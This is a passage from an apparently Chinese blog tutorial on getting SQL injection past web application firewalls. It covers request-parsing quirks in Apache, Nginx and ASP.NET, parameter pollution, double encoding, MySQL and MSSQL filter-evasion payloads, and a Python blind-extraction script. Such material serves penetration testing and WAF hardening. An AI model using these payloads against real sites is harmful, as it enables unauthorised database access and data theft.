<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-apache-test.jpg" alt="php-apache-test"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果某些WAF在处理数据的时候严格按照GET,POST等方式来获取数据，就会因为apache的宽松的请求方式导致bypass。 实例： WooYun: 安全宝SQL注入规则绕过</span><br><span class="line"></span><br><span class="line">ps.测试的时候使用了apache2.4.7的版本。</span><br></pre></td></tr></table></figure>
<h6 id="php-apache畸形的boundary"><a href="#php-apache畸形的boundary" class="headerlink" title="php+apache畸形的boundary"></a>php+apache畸形的boundary</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为----aaaa,123456，php解析的时候只识别了----aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS。</span><br><span class="line"></span><br><span class="line">参考：http://blog.phdays.com/2014/07/review-of-waf-bypass-tasks.html</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-apache-test2.jpg" alt="php-apache-test2"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如上图，可能出现waf获取的是一个图片的内容，而在web端获取的是aid=2的值。这样的差别就有可能造成bypass。</span><br></pre></td></tr></table></figure>
<h5 id="nginx服务器"><a href="#nginx服务器" class="headerlink" title="nginx服务器"></a>nginx服务器</h5><h6 id="畸形method-1"><a href="#畸形method-1" class="headerlink" title="畸形method"></a>畸形method</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同apache，畸形method默认为GET方法</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-nginx-test.png" alt="php-nginx-test"></p>
<h6 id="post长数据，绕过ngx-lua-waf"><a href="#post长数据，绕过ngx-lua-waf" class="headerlink" title="post长数据，绕过ngx_lua_waf"></a>post长数据，绕过ngx_lua_waf</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post数据</span><br><span class="line">x=n个x&amp;id=payload</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-nginx-test2.png" alt="php-nginx-test2"></p>
<h4 id="Web应用程序层bypass"><a href="#Web应用程序层bypass" class="headerlink" title="Web应用程序层bypass"></a>Web应用程序层bypass</h4><h5 id="双重url编码"><a href="#双重url编码" class="headerlink" title="双重url编码"></a>双重url编码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双重url编码，即对于浏览器发送的数据进行了两次urlencode操作，如s做一次url编码是%73,再进行一次编码是%25%37%33。一般情况下数据经过WAF设备的时候只会做一次url解码，这样解码之后的数据一般不会匹配到规则，达到了bypass的效果。</span><br><span class="line"></span><br><span class="line">个人理解双重url编码，要求数据在最后被程序执行之前，进行了两次url解码，如果只进行了一次解码，这样在最后的结果也是不会被正确执行的。 实例： WooYun: 腾讯某分站SQL注射-直接绕过WAF</span><br></pre></td></tr></table></figure>
<h5 id="请求获取方式"><a href="#请求获取方式" class="headerlink" title="请求获取方式"></a>请求获取方式</h5><ol>
<li>变换请求方式</li>
</ol>
<h6 id="GET-POST-COOKIE"><a href="#GET-POST-COOKIE" class="headerlink" title="GET,POST,COOKIE"></a>GET,POST,COOKIE</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在web环境下有时候会出现统一参数获取的情况，主要目的就是对于获取的参数进行统一过滤。例如我获取的参数t=select 1 from 2 这个参数可以从get参数中获取，可以从post参数获取，也可以从cookie参数中获取。</span><br><span class="line"></span><br><span class="line">典型的dedecms，在之前测试的时候就发现了有些waf厂商进行过滤的时候过滤了get和post，但是cookie没有过滤，直接更改cookie参数提交payload，即绕过。</span><br><span class="line"></span><br><span class="line">实例: WooYun: 百度云加速防御规则绕过之三 一个dedecms的站，get，post均过滤了，但是并没有过滤cookie参数。</span><br></pre></td></tr></table></figure>
<h6 id="urlencode和form-data"><a href="#urlencode和form-data" class="headerlink" title="urlencode和form-data"></a>urlencode和form-data</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST在提交数据的时候有两种方式，第一种方式是使用urlencode的方式提交，第二种方式是使用form-data的方式提交。当我们在测试站点的时候，如果发现POST提交的数据被过滤掉了，此时可以考虑使用form-data的方式去提交。</span><br><span class="line"></span><br><span class="line">我们在阿里云ecs主机上搭建个环境，创建一个存在sql注入漏洞的页面，获取参数从POST上获取，首先我以urlencode的方式提交，查看发现提交的请求被阻断了。</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aiy-post-test.jpg" alt="aiy-post-test"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其次我们以form-data的方式提交，发现爆出了数据库的版本。</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aiy-post-test2.jpg" alt="aiy-post-test2"></p>
<ol start="2">
<li>畸形请求方式</li>
</ol>
<h6 id="asp-asp-net-request解析"><a href="#asp-asp-net-request解析" class="headerlink" title="asp&#x2F;asp.net request解析"></a>asp&#x2F;asp.net request解析</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在asp和asp.net中使用参数获取用户的提交的参数一般使用request包，譬如使用request[&#x27;&#x27;]来获取的时候可能就会出现问题。 资料文档：http://www.80sec.com/%E6%B5%85%E8%B0%88%E7%BB%95%E8%BF%87WAF%E7%9A%84%E6%95%B0%E7%A7%8D%E6%96%B9%E6%B3%95.html</span><br><span class="line"></span><br><span class="line">当使用request[&#x27;&#x27;]的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-type。</span><br><span class="line"></span><br><span class="line">我们搭建一个实例：</span><br><span class="line"></span><br><span class="line">我们创建一个letmetest.aspx的界面获取用户提交的内容，并且将request[&#x27;t&#x27;]的内容打印出来。【在服务器上安装了安全狗】 首先我们提交正常的POST请求，发现已经被安全狗阻断了：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/dog-post-test.jpg" alt="dog-post-test"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此时我们提交畸形的请求，method为GET，但是内容为POST的内容，发现打印出来了内容。</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/dog-post-test2.jpg" alt="dog-post-test2"></p>
<h5 id="hpp方式"><a href="#hpp方式" class="headerlink" title="hpp方式"></a>hpp方式</h5><table>
<thead>
<tr>
<th>Web服务器</th>
<th>参数获取函数</th>
<th>获取到的参数</th>
</tr>
</thead>
<tbody><tr>
<td>PHP&#x2F;Apache</td>
<td>$_GET(“par”)</td>
<td>Last</td>
</tr>
<tr>
<td>JSP&#x2F;Tomcat</td>
<td>Request.getParameter(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Perl(CGI)&#x2F;Apache</td>
<td>Param(“par”)</td>
<td>First</td>
</tr>
<tr>
<td>Python&#x2F;Apache</td>
<td>getvalue(“par”)</td>
<td>All</td>
</tr>
<tr>
<td>ASP&#x2F;IIS</td>
<td>Request.QueryString(“par”)</td>
<td>All</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HPP是指HTTP参数污染。形如以下形式：</span><br><span class="line"></span><br><span class="line">?id=1&amp;id=2&amp;id=3的形式，此种形式在获取id值的时候不同的web技术获取的值是不一样的。</span><br><span class="line"></span><br><span class="line">假设提交的参数即为：</span><br><span class="line"></span><br><span class="line">id=1&amp;id=2&amp;id=3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Asp.net + iis：id=1,2,3</span><br><span class="line">Asp + iis：id=1,2,3</span><br><span class="line">Php + apache：id=3</span><br><span class="line">如此可以分析：当WAF获取参数的形式与WEB程序获取参数的形式不一致的时候，就可能出现WAF bypass的可能。</span><br><span class="line"></span><br><span class="line">Ps.此处关键还是要分析WAF对于获取参数的方式是如何处理的。这里也要再提一下的，hpp的灵活运用，譬如有些cms基于url的白名单，因此可以利用hpp的方式在参数一的位置添加白名单目录，参数2的位置添加恶意的payload。形如index.php?a=[whitelist]&amp;a=select 1 union select 2</span><br><span class="line"></span><br><span class="line">实例参考： WooYun: 使用webscan360的cms厂商通过hpp可使其失效（附cmseasy新版sql注射）</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">show_user.aspx?id<span class="operator">=</span><span class="number">5</span>;<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">3</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>id<span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="数据库层bypass"><a href="#数据库层bypass" class="headerlink" title="数据库层bypass"></a>数据库层bypass</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">数据库层bypass常常是在bypass waf的sql注入防护规则。我们需要针对数据库使用该数据库的特性即可。如mysql，sqlserver等等。最近一直想整理下oracle的，这块也是研究不多的，后续整理后添加到文档里。</span><br><span class="line"></span><br><span class="line">Ps.目前数据库被暴露出来的特性很多很多，基本上很多特性综合利用就已经够用了，因此特性知不知道是一方面，能不能灵活运用就得看测试者自己了。</span><br></pre></td></tr></table></figure>

<h5 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h5><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">就目前来看mysql是使用最多的，也是研究人员研究最深的数据库。在我自己测试的角度上我一般会去测试下面的过滤点，因为一般绕过了select from就基本可以sql注入获取数据了。</span><br></pre></td></tr></table></figure>

<h6 id="常见过滤的位置"><a href="#常见过滤的位置" class="headerlink" title="常见过滤的位置"></a>常见过滤的位置</h6><ul>
<li>第一：参数和union之间的位置</li>
</ul>
<p><a href="http://zone.wooyun.org/content/16772">http://zone.wooyun.org/content/16772</a> 贴中有相关总结。</p>
<ol>
<li>\Nunion的形式：</li>
</ol>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/union-test.jpg" alt="union-test"></p>
<ol start="2">
<li>浮点数的形式如1.1,8.0:</li>
</ol>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/float-test.jpg" alt="float-test"></p>
<ol start="3">
<li>8e0的形式:</li>
</ol>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8e0-test.jpg" alt="8e0-test"></p>
<ol start="4">
<li>利用&#x2F;*!50000*&#x2F;的形式:</li>
</ol>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/50000-test.jpg" alt="50000-test"></p>
<ul>
<li>第二：union和select之前的位置</li>
</ul>
<ol>
<li>空白字符</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%a0；</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">使用空白注释</span><br><span class="line">/*xxxx*/</span><br><span class="line">/*!xxxx*/</span><br><span class="line"></span><br><span class="line">例子:</span><br><span class="line">union/**s**/select/**s**/   #绕过360</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用括号</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">select(*)from(tab_name);</span><br></pre></td></tr></table></figure>

<ul>
<li>第三：union select后的位置</li>
</ul>
<ol>
<li>空白字符</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%a0；</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">使用空白注释</span><br><span class="line">/*xxxx*/</span><br><span class="line">/*!xxxx*/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他方式：(这里需要考虑的是有时候union select和select from可能是两个规则，这里先整理union select的)</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">(1)括号：</span><br><span class="line">select(*)from(tab_name);</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">(2)运算符号：</span><br><span class="line">减号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass1.jpg" alt="mysql-bypass1"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">加号：</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass2.jpg" alt="mysql-bypass2"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">~号：</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass3.jpg" alt="mysql-bypass3"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">!号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass4.jpg" alt="mysql-bypass4"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">@`形式`:</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass5.jpg" alt="mysql-bypass5"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">*号，利用/*!50000*/的形式:</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass6.jpg" alt="mysql-bypass6"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">单引号和双引号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass7.jpg" alt="mysql-bypass7"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;括号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass8.jpg" alt="mysql-bypass8"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">\N符号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass9.jpg" alt="mysql-bypass9"></p>
<ul>
<li>第四：select from之间的位置</li>
</ul>
<ol>
<li>空白字符</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%a0；</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">使用空白注释</span><br><span class="line">/*xxxx*/</span><br><span class="line">/*!xxxx*/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">``符号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass10.jpg" alt="mysql-bypass10"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+,-,!,~,&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass11.jpg" alt="mysql-bypass11"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">*号</span><br><span class="line"></span><br><span class="line">&#123;号</span><br><span class="line"></span><br><span class="line">(号</span><br></pre></td></tr></table></figure>

<ul>
<li>第五：select from之后的位置</li>
</ul>
<ol>
<li>空白字符</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%a0；</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">使用空白注释</span><br><span class="line">/*xxxx*/</span><br><span class="line">/*!xxxx*/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">``号</span><br><span class="line"></span><br><span class="line">*号</span><br><span class="line"></span><br><span class="line">&#123;号</span><br><span class="line"></span><br><span class="line">(括号</span><br><span class="line"></span><br><span class="line">Ps.空白符，注释符，/!50000select*/,&#123;x version&#125;,(),在很多点都可以使用，某些点有自己特殊的地方，可以使用一些其他的符号。</span><br><span class="line"></span><br><span class="line">实例：http://wooyun.org/bugs/wooyun-2010-0121291 实例就是利用灵活利用上面的特性，导致了bypass。</span><br></pre></td></tr></table></figure>

<h6 id="mysql常见过滤函数"><a href="#mysql常见过滤函数" class="headerlink" title="mysql常见过滤函数"></a>mysql常见过滤函数</h6><ul>
<li>字符串截取函数</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line">以上全部被过滤时，使用concat：</span><br><span class="line">payload:</span><br><span class="line">hex(user()&lt;concat(char(67)))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">附带脚本：</span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url=<span class="string">&quot;http://sqlitest.anquanbao.com.cn/api/query?art_id=hex(version()&lt;CONCAT(%s))&quot;</span></span><br><span class="line">pre=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">128</span>:</span><br><span class="line">    <span class="comment">#print url</span></span><br><span class="line">    r=requests.get(url%(pre+<span class="string">&#x27;char(&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;)&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span> r.url</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(r.text)&gt;<span class="number">203</span>:</span><br><span class="line">        <span class="keyword">if</span> i!=<span class="number">33</span>:</span><br><span class="line">            pre=pre+<span class="string">&#x27;char(&#x27;</span>+<span class="built_in">str</span>(i-<span class="number">1</span>)+<span class="string">&#x27;),&#x27;</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> result</span><br><span class="line">            i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>字符串连接函数</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">concat(version(),&#x27;|&#x27;,user());</span><br><span class="line">concat_ws(&#x27;|&#x27;,1,2,3)</span><br></pre></td></tr></table></figure>

<ul>
<li>字符转换</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Ascii(1)    #此函数之前测试某云waf的时候被过滤了，然后使用ascii(1)即可，函数名大小写绕过</span><br><span class="line">Char(49)    #范围0-255内可利用？</span><br><span class="line">Hex(&#x27;A&#x27;)</span><br><span class="line">Unhex(61)</span><br></pre></td></tr></table></figure>

<h6 id="过滤了逗号"><a href="#过滤了逗号" class="headerlink" title="过滤了逗号"></a>过滤了逗号</h6><ul>
<li>substr,mid等，使用from</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">mid(user() from 1 for 1)</span><br><span class="line">或</span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line">最后结合ascii()取左边第一位，逐位猜解，此外还可以使用hex()？</span><br></pre></td></tr></table></figure>

<ul>
<li>limit，使用offset</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tab_name limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>union处的逗号</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">通过<span class="keyword">join</span>拼接</span><br><span class="line"></span><br><span class="line">爆显示位</span><br><span class="line">payload：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span>&#123;x schema_name&#125; <span class="keyword">from</span> information_schema.schemata limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/sql-join.jpg" alt="sql-join"></p>
<h6 id="浮点精度特性"><a href="#浮点精度特性" class="headerlink" title="浮点精度特性"></a>浮点精度特性</h6><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php中:</span><br><span class="line">1.0000000000001 != 1</span><br><span class="line">1.0000000000000001</span><br><span class="line">在MySQL中:</span><br><span class="line">1.0000000000001 == 1</span><br><span class="line">1.0000000000000001 == 1</span><br></pre></td></tr></table></figure>

<h5 id="sqlserver数据库"><a href="#sqlserver数据库" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h5><h6 id="常见过滤位置"><a href="#常见过滤位置" class="headerlink" title="常见过滤位置"></a>常见过滤位置</h6><ul>
<li>第一：select from后的位置</li>
</ul>
<ol>
<li>空白符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 </span><br><span class="line">需要做urlencode，sqlserver中的表示空白字符比较多，靠黑名单去阻断一般不合适。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mssql也可以使用注释符号/**/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">.符号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass1.jpg" alt="mssql-bypass1"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">:符号</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass2.jpg" alt="mssql-bypass2"></p>
<ul>
<li>第二：select from之间的位置</li>
</ul>
<ol>
<li>空白符号：</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 </span><br><span class="line">需要做urlencode，sqlserver中的表示空白字符比较多，靠黑名单去阻断一般不合适。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mssql也可以使用注释符号/**/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">:符号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass2-1768461187407-41.jpg" alt="mssql-bypass2"></p>
<ul>
<li>第三：and之后的位置</li>
</ul>
<ol>
<li>空白符号：</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 </span><br><span class="line">需要做urlencode，sqlserver中的表示空白字符比较多，靠黑名单去阻断一般不合适。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mssql也可以使用注释符号/**/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">:符号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass2-1768461194890-43.jpg" alt="mssql-bypass2"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">%2b号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass3.jpg" alt="mssql-bypass3"></p>
<h6 id="mssql常见过滤函数"><a href="#mssql常见过滤函数" class="headerlink" title="mssql常见过滤函数"></a>mssql常见过滤函数</h6><ol>
<li>字符串截取函数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Substring(@@version,1,1)</span><br><span class="line">Left(@@version,1)</span><br><span class="line">Right(@@version,1)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>字符串转换函数</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Ascii(&#x27;a&#x27;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</span><br><span class="line">Char(&#x27;97&#x27;)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他方式</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Mssql支持多语句查询，因此可以使用；结束上面的查询语句，然后执行自己构造的语句。动态执行。</span><br><span class="line"></span><br><span class="line">使用exec的方式：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass4.jpg" alt="mssql-bypass4"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">使用sp_executesql的方式：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass5.jpg" alt="mssql-bypass5"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">使用这类可以对自己的参数进行拼接，可以绕过WAF防御。</span><br><span class="line"></span><br><span class="line">如使用该类特性然后加上上面提到的:的特性就可以绕过安全狗的注入防御。</span><br></pre></td></tr></table></figure>

<h4 id="WAF层bypass"><a href="#WAF层bypass" class="headerlink" title="WAF层bypass"></a>WAF层bypass</h4><h5 id="性能bypass"><a href="#性能bypass" class="headerlink" title="性能bypass"></a>性能bypass</h5><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">WAF在设计的时候都会考虑到性能问题，例如如果是基于数据包的话会考虑检测数据包的包长，如果是基于数据流的话就会考虑检测一条数据流的多少个字节。一般这类算检测的性能，同时为了保证WAF的正常运行，往往还会做一个bypass设计，在性能如cpu高于80%或则内存使用率高于如80%是时候，会做检测bypass，以保证设备的正常运行。</span><br><span class="line"></span><br><span class="line">WAF等设备都是工作在应用层之上的，如HTTP,FTP,SMTP等都是应用层的协议，这些数据要被处理都会被进行数据解析，协议分析。最终获取应用层的数据。如HTTP的方法是什么，HTTP的querystring是什么，以及HTTP的requestbody是什么。然后将这些实时获取的值与WAF设计的规则进行匹配，匹配上着命中规则做相应的处理。</span><br></pre></td></tr></table></figure>

<h6 id="性能检测bypass"><a href="#性能检测bypass" class="headerlink" title="性能检测bypass"></a>性能检测bypass</h6><p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/per-bypass1.jpg" alt="per-bypass1"></p>
